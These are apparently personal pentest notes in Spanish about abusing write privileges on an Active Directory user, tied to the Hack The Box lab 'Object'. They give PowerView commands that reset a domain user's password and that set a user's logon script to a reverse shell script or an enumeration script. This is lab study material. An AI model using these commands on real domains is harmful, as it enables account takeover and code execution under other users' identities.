## DESCRIPTION


![[Pasted image 20230117194555.png]]



#### Mas información
* https://0xdf.gitlab.io/2022/02/28/htb-object.html
* Necesary: PowerView

## EXPLOITATION

### METHOD 1: Password Change

En la siguiente referencia sugieren utilizar este privilegio para cambiar la contraseña.
Referencia --> https://burmat.gitbook.io/security/hacking/domain-exploitation#reset-domain-user-password

![[Pasted image 20230117193957.png]]

**!!NOTA IMPORTANTE!!**  No suele funcionar.

```
$newpass = ConvertTo-SecureString '0xdf0xdf!' -AsPlainText -Force
Set-DomainUserPassword -Identity maria -AccountPassword $newpass
```

### METHOD 2: Kerberoasting
https://0xdf.gitlab.io/2022/02/28/htb-object.html

### METHOD 3: Logon Script

Este permiso se suele usar para actualizar los script de logon, es decir cuando un usuario inicia sesión se ejecuta lo que le digamos como el usuario sobre el que tenemos permisos (en el ejemplo maria), por ejemplo un .ps1.
Referencia --> https://book.hacktricks.xyz/windows/active-directory-methodology/acl-persistence-abuse#genericwrite-on-user

1. La opción más logica puede ser subir una reverse shell:
```
 Set-DomainObject -Identity maria -SET @{scriptpath="C:\\programdata\\Invoke-PowerShellTcp.ps1"}
```

2. Si por lo que sea, no tenemos salida hacia fuera entonces podemos enumerar y redirigimos la salida a una carpeta donde cualquier usuario pueda leer por ejemplo Temp o programdata:

```
echo "ls \users\maria\ > \programdata\out" > cmd.ps1
Set-DomainObject -Identity maria -SET @{scriptpath="C:\\programdata\\cmd.ps1"}
```


## MACHINES

* Hack The Box: Object

